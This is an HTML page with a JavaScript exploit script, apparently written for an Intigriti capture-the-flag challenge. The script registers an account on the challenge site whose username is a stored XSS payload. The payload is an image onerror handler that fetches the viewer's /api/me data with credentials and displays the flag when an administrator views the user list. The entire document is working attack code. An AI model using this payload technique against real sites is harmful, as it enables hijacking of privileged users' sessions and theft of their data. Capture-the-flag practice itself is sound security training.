<!DOCTYPE html>
<html>
<body>
<h3>Registering XSS account...</h3>
<script>
// Register with XSS payload as username
const randomUser = 'user_' + Math.random().toString(36).substr(2, 9);
const xssUser = `<img src=x onerror="fetch('/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>alert('FLAG: '+d.flag))">`;

fetch('https://challenge-0126.intigriti.io/api/register', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        username: xssUser,
        password: 'Test1234!'
    })
})
.then(r=>r.json())
.then(d=>{
    document.body.innerHTML = '<h3>Registered! Admin will trigger XSS when viewing user list.</h3>';
})
.catch(e=>document.body.innerHTML = '<h3>Error: '+e+'</h3>');
</script>
</body>
</html>
